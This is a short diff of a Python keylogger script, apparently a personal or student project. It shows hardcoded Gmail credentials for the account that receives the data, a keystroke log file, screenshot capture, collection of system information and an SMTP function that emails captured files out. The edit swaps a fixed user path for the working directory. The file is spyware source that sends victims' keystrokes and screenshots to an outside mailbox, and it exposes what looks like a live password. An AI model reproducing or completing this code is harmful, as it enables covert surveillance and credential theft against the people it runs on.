@@ -19,6 +19,7 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+
 #variable declaration for email
 email_address = "keyclog@gmail.com"
 password = "zplhvxysqwztdygc"
@@ -26,7 +27,7 @@ to_addr = "keyclog@gmail.com"
 
 # variable declaration for keylog
 key_log = "log.txt"
-file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
+file_path = os.getcwd()
 extend = "\\"
 
 # variable declarations for system info
@@ -66,8 +67,6 @@ def send_email(filename, attachment, toaddr, subject):
     s.sendmail(from_addr, to_addr, text)
     # end the session
     s.quit()
-
-#send_email(key_log, file_path + extend + key_log, to_addr)
 
 # grabbing computer information function
 def comp_info():
